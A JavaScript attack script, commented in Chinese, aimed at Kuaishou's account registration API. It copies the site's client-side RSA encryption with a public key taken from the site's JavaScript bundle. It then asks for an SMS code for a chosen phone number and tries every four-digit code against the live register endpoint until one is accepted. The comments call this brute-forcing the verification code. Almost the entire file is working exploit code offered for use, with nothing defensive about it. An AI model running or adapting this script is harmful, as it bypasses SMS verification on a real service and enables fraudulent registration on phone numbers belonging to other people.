import "./jsencrypt.min.mjs"
import { re, ne, se } from "./misc.mjs"

// 项目中使用到了一个已经过时了的开源JS加密库
// https://github.com/travist/jsencrypt/tree/v3.2.1
const jsEncrypt = new JSEncrypt()

// https://w2.kskwai.com/kos/nlav12555/js/app.2ce2c20f.js 中发现的公钥
jsEncrypt.setPublicKey("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAjWfCb9IR5pMheXLUHCQko8VddGGDZ2jN0Edj/yQoXl91plE6r/muh1oKeuWtSpDwqDDAO5s3lHYfPFb45eWTky0a4ijOBlGbls5WJBQqoqD3gYTPcZyc1KFmn9wRTbNLMFhWN2kCHzo6YOO9kRcCQdAuXaj2sxFrirdglL8v7I0gp0n2ME+3V4Jwiv86cL24t6DfzxHqW/CO7Q/7P6bE5xVZHkuup7J1vXrjewN0r9nXovmahYlLIop4QuWC6zDVHDSTk/SXifHJBidOgEWHKgQSC5FS3xism5bth8XKWu4WX/z2pND4vA4STNE9LwULQPX2MJFjqUdYG7fBePZnIwIDAQAB")

function encryptPhone(phone) {         // 手机号加密
  let ans = jsEncrypt.encrypt(phone)
  return se(ans, "hex")
}

function encryptPassword(password, timestamp, nonce) {   // 密码加密
  let ans = jsEncrypt.encrypt(`${timestamp}_${nonce}_${password}`)
  return se(ans, "hex")
}

function genPayload(password, phone, smsCode) {
  return new URLSearchParams({
    sid: "kuaishou.web.api",
    type: "42",
    countryCode: "+86",
    encryptHeaders: "",
    password,
    ignorePwd: "false",
    phone,
    ignoreAccount: "false",
    smsCode,
    captchaToken: "",
    channelType: "PC_PAGE"
  })
}

async function requestMobileCode() {
  return await (await fetch("https://id.kuaishou.com/pass/kuaishou/sms/requestMobileCode", {
    method: "post",
    body: new URLSearchParams({
      sid: "kuaishou.web.api",
      type: "42",
      countryCode: "+86",
      phone: phonePlainText,
      account: "",
      ztIdentityVerificationType: "", 
      ztIdentityVerificationCheckToken: "",
      channelType: "PC_PAGE",
      encryptHeaders: ""
    })
  })).json()
}

async function traveral() {
  for (let i = 1000; i < 9999; i++) {     // 爆破验证码
    const nonce = ne()
    const timestamp = re()
    const password = encryptPassword("Test@123", timestamp, nonce)
    const phone = encryptPhone(phonePlainText)
    // console.log(`nonce: ${nonce}`)
    // console.log(`timestamp: ${timestamp}`)
    // console.log(`password: ${password}`)
    // console.log(`phone: ${phone}`)
    const res = await (await fetch("https://id.kuaishou.com/pass/kuaishou/register/mobile/v2", {
      method: "post",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Yzzh-Nc": nonce,
        "Yzzh-Tsp": timestamp,
        "Yzzh-Vs": "version0",
      },
      body: genPayload(password, phone, i)
    })).json()
    if (res.error_msg == "验证码不正确") {
      console.log(`${i} 验证码不正确`)
    } else {
      console.log(res)
      break
    }
  }
}

const phonePlainText = "18888888888"    // 这里输入你想注册的手机号
let res = await requestMobileCode()
console.log(res)
if (res.result === 1) {
  console.log("验证码请求成功 开始爆破！")
  traveral()
}